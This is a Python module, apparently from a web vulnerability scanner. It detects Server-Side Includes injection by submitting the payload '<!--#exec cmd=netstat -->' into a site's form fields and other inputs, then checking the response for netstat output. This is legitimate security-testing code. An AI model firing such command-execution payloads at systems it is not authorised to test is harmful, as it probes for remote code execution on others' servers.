from Classes.Utilities import Utilities
from CustomImports import html_report


def t_i_ssi(url, form, form_data):
    try:
        # Non-blind detection. Search for UNIX time format in response.
        ssi_payload = '<!--#exec cmd=netstat -->'
        # Inject only injectable fields
        injection_keys = Utilities.extract_injection_fields_from_form(form_data)
        for injection_key in injection_keys:
            form_data[injection_key] = ssi_payload
        response = Utilities.submit_form(url, form, form_data)
        if not response:
            return False
        if 'active internet connections' in str(response.text).lower():
            return True
        return False
    except Exception as e:
        Utilities.print_except_message('error', e, "Something went wrong when testing for SSI (Server-Side Includes).",
                                  url)
        pass


def t_i_ssi_nfi(url):
    try:
        # Non-blind detection. Search for UNIX time format in response.
        ssi_payload = '<!--#exec cmd=netstat -->'
        response_injected = Utilities.no_form_input_content(url, ssi_payload)
        if not response_injected:
            return False
        for response_inj in response_injected:
            if 'active internet connections' in str(response_inj.text).lower():
                return True
        return False
    except Exception as e:
        Utilities.print_except_message('error', e,
                                  "Something went wrong when testing for SSI (Server-Side Includes) in non-form inputs.",
                                  url)
        pass


def run(url):
    try:
        form_list, form_data_list = Utilities.extract_forms_and_form_data(url)
        for index, form in enumerate(form_list):
            if t_i_ssi(url, form, form_data_list[index]):
                html_report.add_vulnerability('SSI Code Execution Injection',
                                              'SSI Code Execution Injection Vulnerability identified on URL: {}.'.format(
                                                  url), 'High')
        # Scan non-form inputs
        if t_i_ssi_nfi(url):
            html_report.add_vulnerability('SSI Code Execution Injection',
                                          'SSI Code Execution Injection Vulnerability identified on URL: {}.'.format(
                                              url), 'High')
    except Exception as e:
        Utilities.print_except_message('error', e, "Something went wrong when testing for SSI (Server-Side Includes).",
                                  url)
        pass